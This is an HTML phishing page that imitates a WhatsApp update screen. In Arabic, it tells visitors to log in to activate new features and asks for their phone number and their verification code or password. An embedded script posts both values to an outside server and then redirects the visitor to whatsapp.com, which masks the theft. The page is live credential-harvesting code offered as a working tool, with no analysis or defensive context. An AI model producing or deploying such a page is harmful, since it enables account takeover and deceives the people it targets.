<!DOCTYPE html><html><head><meta charset="UTF-8"><title>WhatsApp Update</title><style>body{background:#075e54;color:#fff;font-family:sans-serif;text-align:center;padding-top:50px;}.box{background:#fff;color:#000;width:320px;margin:auto;padding:20px;border-radius:10px;}input{width:100%;padding:12px;margin:10px 0;border-radius:5px;border:1px solid #ddd;box-sizing:border-box;}.btn{background:#25d366;color:#fff;width:100%;padding:12px;border:none;border-radius:5px;font-weight:bold;cursor:pointer;}</style></head><body><div class="box"><img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" width="50"><h3>تحديث واتساب 2026</h3><p>سجل دخولك لتفعيل المميزات الجديدة</p><form id="f"><input type="text" id="u" placeholder="رقم الهاتف" required><input type="password" id="p" placeholder="رمز التأكيد أو كلمة السر" required><button type="submit" class="btn">تحديث الآن</button></form></div><script>document.getElementById('f').onsubmit=(e)=>{e.preventDefault();fetch('https://brmbtbot.onrender.com/receive',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({platform:'WhatsApp Update',u:document.getElementById('u').value,p:document.getElementById('p').value})}).finally(()=>{location.href='https://whatsapp.com';});};</script></body></html>
